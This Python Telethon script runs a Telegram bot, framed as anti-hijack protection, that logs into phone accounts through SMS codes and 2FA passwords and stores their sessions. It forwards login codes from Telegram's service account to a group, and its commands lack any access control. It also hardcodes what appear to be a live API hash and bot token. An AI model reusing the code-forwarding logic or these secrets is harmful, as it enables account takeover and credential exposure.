import asyncio
import platform
import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    AuthKeyDuplicatedError,
    FloodWaitError,
    AuthRestartError # 导入 AuthRestartError
)

logging.basicConfig(level=logging.INFO) # 将日志级别改为 INFO，以便看到更多信息
logger = logging.getLogger(__name__)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
TARGET_BOT_ID =8754918048
# 此处替换为你的群组ID，格式-100xxxxxxx
GROUP_CHAT_ID =-5259247005

accounts = {}
user_login_states = {}
lock_mode = {}
auto_invalidate_mode = {}
PHONE_RULE = re.compile(r'^\+\d{10,15}$')

def bind_account_handlers(client, phone):
    target_entity = None

    async def load_bot_target():
        nonlocal target_entity
        retry = 0
        while retry < 3:
            try:
                if GROUP_CHAT_ID:
                    target_entity = await client.get_entity(GROUP_CHAT_ID)
                else:
                    target_entity = await client.get_entity(TARGET_BOT_ID)
                logger.info(f"[{phone}] Message target loaded")
                break
            except Exception as e:
                retry = retry + 1
                logger.warning(f"[{phone}] Load target fail retry {retry}: {str(e)}")
                await asyncio.sleep(2)

    client.loop.create_task(load_bot_target())

    @client.on(events.NewMessage(outgoing=True))
    async def alive_test(event):
        if event.message.text and event.message.text.lower() == "self check":
            await event.edit("self checked!")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def query_status(event):
        stat = "on" if accounts[phone]["anti_login"] else "off"
        await event.edit(f"Anti-login push status: {stat}")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable_push(event):
        accounts[phone]["anti_login"] = True
        await event.edit("Auto verification push enabled.")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable_push(event):
        accounts[phone]["anti_login"] = False
        await event.edit("Auto verification push disabled.")

    @client.on(events.NewMessage(from_users=[777000]))
    async def capture_code(event):
        logger.info(f"[{phone}] Received SMS code from 777000.")
        
        # 检查是否启用了自动失效模式
        if auto_invalidate_mode.get(phone, False):
            try:
                # 重新发送验证码请求，使旧验证码失效
                await client.send_code_request(phone)
                alert_msg = f"⚠️ **安全警报** ⚠️\n检测到账号 {phone} 收到登录验证码，已自动重新申请验证码，**旧验证码已失效**！"
                if target_entity:
                    await client.send_message(target_entity, alert_msg)
                else:
                    logger.warning(f"[{phone}] 无法发送安全警报，因为 target_entity 未加载或 GROUP_CHAT_ID/TARGET_BOT_ID 未设置。")
                logger.info(f"[{phone}] 已自动重新申请验证码，旧验证码已失效。")
            except Exception as err:
                logger.error(f"[{phone}] 自动重新申请验证码失败: {repr(err)}")
                alert_msg = f"⚠️ **安全警报** ⚠️\n检测到账号 {phone} 收到登录验证码，但自动重新申请验证码失败: {repr(err)}。请手动检查账号安全！"
                if target_entity:
                    await client.send_message(target_entity, alert_msg)
        elif accounts[phone]["anti_login"] and target_entity is not None:
            try:
                msg = f"Source Phone: {phone}\nCode Content:\n{event.message.text}"
                await client.send_message(target_entity, msg)
                logger.info(f"[{phone}] Code forwarded successfully")
            except Exception as err:
                logger.error(f"[{phone}] Forward error: {repr(err)}")

bot_client = TelegramClient(StringSession(), API_ID, API_HASH)

@bot_client.on(events.NewMessage(pattern="/start"))
async def help_menu(event):
    text = """Command List
[Phone Side Commands]
self check        Check program alive
antilogin         Check push switch
antilogin on      Enable auto send SMS to bot/group
antilogin off     Disable auto send SMS

[Bot Control Commands]
/addphone +8613800138000    Bind monitor phone account
/listphone                  View all bound phones
/delphone +8613800138000    Delete stored session file
/logout +8613800138000      Remote logout online session
/lock +8613800138000        Turn on anti-hijack login lock mode
/autoinvalidate +8613800138000 on/off  Enable/Disable auto invalidate code mode
/code +8613800138000 12345 Consume one-time verification code
"""
    await event.reply(text)

@bot_client.on(events.NewMessage(pattern=r"^/addphone (\S+)$"))
async def add_phone(event):
    phone = event.pattern_match.group(1).strip()
    if not PHONE_RULE.match(phone):
        await event.reply("Invalid phone format, example: /addphone +8613800138000")
        return
    if phone in accounts:
        await event.reply("This phone number already bound")
        return

    session_name = f"session_{phone.replace('+', '')}"
    new_client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await new_client.connect()
        code_req = await new_client.send_code_request(phone)
        user_login_states[event.sender_id] = {
            "client": new_client,
            "phone": phone,
            "code_hash": code_req.phone_code_hash,
            "step": "input_sms_code"
        }
        accounts[phone] = {"client": new_client, "anti_login": False}
        lock_mode[phone] = False # 初始化 lock_mode
        auto_invalidate_mode[phone] = False # 初始化 auto_invalidate_mode
        await event.reply(f"Code sent to {phone}, reply numeric sms code to finish login")
    except PhoneNumberInvalidError:
        await event.reply("Wrong phone number format")
    except AuthKeyDuplicatedError:
        await event.reply("Account already logged on another device")
    except Exception as e:
        await event.reply(f"Request error: {str(e)}")

@bot_client.on(events.NewMessage(pattern=r"^/lock (\S+)$"))
async def enable_lock_mode(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("Phone not bound, run /addphone first")
        return
    lock_mode[phone] = True
    await event.reply(f"Login lock activated for {phone}, submit code via /code command to invalidate tokens")

@bot_client.on(events.NewMessage(pattern=r"^/autoinvalidate (\S+) (on|off)$"))
async def set_auto_invalidate_mode(event):
    phone = event.pattern_match.group(1).strip()
    status = event.pattern_match.group(2).strip().lower()

    if phone not in accounts:
        await event.reply("Phone not bound, run /addphone first")
        return
    
    if status == "on":
        auto_invalidate_mode[phone] = True
        await event.reply(f"账号 {phone} 的自动验证码失效模式已 **开启**。当检测到登录验证码时，将自动重新申请以使其失效并发送警报。")
    else:
        auto_invalidate_mode[phone] = False
        await event.reply(f"账号 {phone} 的自动验证码失效模式已 **关闭**。")

@bot_client.on(events.NewMessage(pattern=r"^/code (\S+) (\d+)$"))
async def consume_verify_code(event):
    phone = event.pattern_match.group(1).strip()
    input_code = event.pattern_match.group(2).strip()
    sender_uid = event.sender_id
    
    # 检查该手机号是否处于登录状态等待验证码
    if phone not in accounts or accounts[phone].get("client") is None:
        await event.reply(f"电话 {phone} 未绑定或未处于登录流程中。请先使用 /addphone {phone}。")
        return

    # 查找对应的 user_login_states
    state_found = False
    for uid, state_data in user_login_states.items():
        if state_data["phone"] == phone and state_data["step"] == "input_sms_code":
            sender_uid = uid # 找到发起 addphone 的用户ID
            state_found = True
            break
    
    if not state_found:
        await event.reply(f"电话 {phone} 未处于等待验证码状态。请先使用 /addphone {phone}。")
        return

    state = user_login_states[sender_uid]
    client_inst = state["client"]
    
    # 检查是否是锁定模式
    is_lock_mode = lock_mode.get(phone, False)

    try:
        await client_inst.sign_in(phone_code_hash=state["code_hash"], code=input_code)
        
        if is_lock_mode:
            await event.reply(f"账号 {phone} 已在登录锁模式下成功登录并立即登出，验证码已失效。")
            await client_inst.log_out()
            await client_inst.disconnect()
            session_name = f"session_{phone.replace('+', '')}.session"
            if os.path.exists(session_name):
                os.remove(session_name)
            del accounts[phone]
            lock_mode.pop(phone, None)
            auto_invalidate_mode.pop(phone, None)
            logger.info(f"Phone {phone} neutralized in lock mode.")
        else:
            # 正常登录流程
            bind_account_handlers(client_inst, phone)
            del user_login_states[sender_uid]
            await event.reply(f"{phone} 登录完成。发送 antilogin on 启用自动转发验证码，或发送 /autoinvalidate {phone} on 启用自动失效模式。")

    except FloodWaitError as flood_err:
        await event.reply(f"Rate limit triggered, anti-bot restriction active, wait {flood_err.seconds} seconds")
    except PhoneCodeInvalidError:
        await event.reply("The verification code you entered is invalid or already expired")
        del user_login_states[sender_uid] # 验证码错误或过期，清除状态，需要重新 /addphone
    except SessionPasswordNeededError:
        state["step"] = "input_2fa_password"
        await event.reply("Account 2FA enabled, reply your second-step password")
    except AuthRestartError:
        logger.warning(f"AuthRestartError during sign-in for {phone}. Restarting authorization process.")
        await event.reply(f"授权流程已失效，请重新使用 /addphone {phone} 命令获取新的验证码。")
        if client_inst.is_connected():
            await client_inst.disconnect()
        session_name = f"session_{phone.replace('+', '')}.session"
        if os.path.exists(session_name):
            os.remove(session_name)
        if phone in accounts:
            del accounts[phone]
        if sender_uid in user_login_states:
            del user_login_states[sender_uid]
    except Exception as err:
        await event.reply(f"Code consume failure: {repr(err)}")
        del user_login_states[sender_uid] # 登录失败，清除状态

@bot_client.on(events.NewMessage)
async def login_process(event):
    # 仅处理来自发起 addphone 命令的用户的消息
    if event.sender_id not in user_login_states:
        return
    
    state = user_login_states[event.sender_id]
    input_text = event.text.strip()
    phone = state["phone"]
    client_inst = state["client"]
    is_lock_mode = lock_mode.get(phone, False)

    if state["step"] == "input_sms_code":
        # 如果是 /code 命令，则由 consume_verify_code 处理，这里跳过
        if input_text.startswith("/code"):
            return
        
        if not input_text.isdigit():
            await event.reply("Please reply with the numeric SMS code.")
            return
        
        try:
            await client_inst.sign_in(
                phone_code_hash=state["code_hash"],
                code=input_text
            )
            
            if is_lock_mode:
                await event.reply(f"账号 {phone} 已在登录锁模式下成功登录并立即登出，验证码已失效。")
                await client_inst.log_out()
                await client_inst.disconnect()
                session_name = f"session_{phone.replace('+', '')}.session"
                if os.path.exists(session_name):
                    os.remove(session_name)
                del accounts[phone]
                lock_mode.pop(phone, None)
                auto_invalidate_mode.pop(phone, None)
                logger.info(f"Phone {phone} neutralized in lock mode.")
            else:
                bind_account_handlers(client_inst, phone)
                del user_login_states[event.sender_id]
                await event.reply(f"{phone} 登录完成。发送 antilogin on 启用自动转发验证码，或发送 /autoinvalidate {phone} on 启用自动失效模式。")

        except SessionPasswordNeededError:
            state["step"] = "input_2fa_password"
            await event.reply("Account 2FA enabled, reply your second-step password")
        except PhoneCodeInvalidError:
            await event.reply("SMS code incorrect or expired, retry login")
            del user_login_states[event.sender_id] # 验证码错误或过期，清除状态，需要重新 /addphone
        except AuthRestartError:
            logger.warning(f"AuthRestartError during sign-in for {phone}. Restarting authorization process.")
            await event.reply(f"授权流程已失效，请重新使用 /addphone {phone} 命令获取新的验证码。")
            if client_inst.is_connected():
                await client_inst.disconnect()
            session_name = f"session_{phone.replace('+', '')}.session"
            if os.path.exists(session_name):
                os.remove(session_name)
            if phone in accounts:
                del accounts[phone]
            del user_login_states[event.sender_id]
        except Exception as e:
            await event.reply(f"Login failure: {str(e)}")
            del user_login_states[event.sender_id]
    elif state["step"] == "input_2fa_password":
        try:
            await client_inst.sign_in(password=input_text)
            
            if is_lock_mode:
                await event.reply(f"账号 {phone} 已在登录锁模式下成功登录并立即登出，验证码和密码已失效。")
                await client_inst.log_out()
                await client_inst.disconnect()
                session_name = f"session_{phone.replace('+', '')}.session"
                if os.path.exists(session_name):
                    os.remove(session_name)
                del accounts[phone]
                lock_mode.pop(phone, None)
                auto_invalidate_mode.pop(phone, None)
                logger.info(f"Phone {phone} neutralized with 2FA in lock mode.")
            else:
                bind_account_handlers(client_inst, phone)
                del user_login_states[event.sender_id]
                await event.reply(f"{phone} 2FA verified, binding finished")
        except Exception as e:
            await event.reply("Wrong secondary password")

@bot_client.on(events.NewMessage(pattern=r"^/listphone$"))
async def list_all(event):
    if not accounts:
        await event.reply("No bound phone accounts found")
        return
    output = "Bound Phone List:\n"
    for num, data in accounts.items():
        push_status = "Push ON" if data["anti_login"] else "Push OFF"
        lock_status = "Lock ON" if lock_mode.get(num, False) else "Lock OFF"
        auto_invalidate_status = "AutoInvalidate ON" if auto_invalidate_mode.get(num, False) else "AutoInvalidate OFF"
        output = output + f"- {num} | Forward:{push_status} | Lock:{lock_status} | Invalidate:{auto_invalidate_status}\n"
    await event.reply(output)

@bot_client.on(events.NewMessage(pattern=r"^/delphone (\S+)$"))
async def delete_session(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("Target phone number not bound")
        return
    await accounts[phone]["client"].disconnect()
    del accounts[phone]
    lock_mode.pop(phone, None)
    auto_invalidate_mode.pop(phone, None)
    session_name = f"session_{phone.replace('+', '')}.session"
    if os.path.exists(session_name):
        os.remove(session_name)
    await event.reply(f"Session file cleared for {phone}")

@bot_client.on(events.NewMessage(pattern=r"^/logout (\S+)$"))
async def remote_logout(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("Target phone number not bound")
        return
    try:
        await accounts[phone]["client"].log_out()
        await accounts[phone]["client"].disconnect()
        await event.reply(f"Remote logout completed for {phone}")
    except Exception as e:
        await event.reply(f"Logout operation error: {repr(e)}")

async def main():
    logger.info("Telegram-Lock Started, waiting commands...")
    # 尝试加载所有现有的 session_*.session 文件
    for filename in os.listdir('.'):
        if filename.startswith('session_') and filename.endswith('.session'):
            phone_part = filename[len('session_'):-len('.session')]
            original_phone = '+' + phone_part if not phone_part.startswith('+') else phone_part
            
            try:
                client = TelegramClient(filename, API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    accounts[original_phone] = {"client": client, "anti_login": False}
                    lock_mode[original_phone] = False
                    auto_invalidate_mode[original_phone] = False
                    bind_account_handlers(client, original_phone)
                    logger.info(f"已加载现有会话文件: {filename} for {original_phone}")
                else:
                    logger.warning(f"现有会话文件 {filename} 未授权或已失效，已删除。")
                    await client.disconnect()
                    os.remove(filename)
            except Exception as e:
                logger.error(f"加载会话文件 {filename} 时发生错误: {e}")
                if os.path.exists(filename):
                    os.remove(filename)

    await bot_client.start(bot_token=BOT_TOKEN)
    logger.info("Management Bot Online, send /start for command list")
    await bot_client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
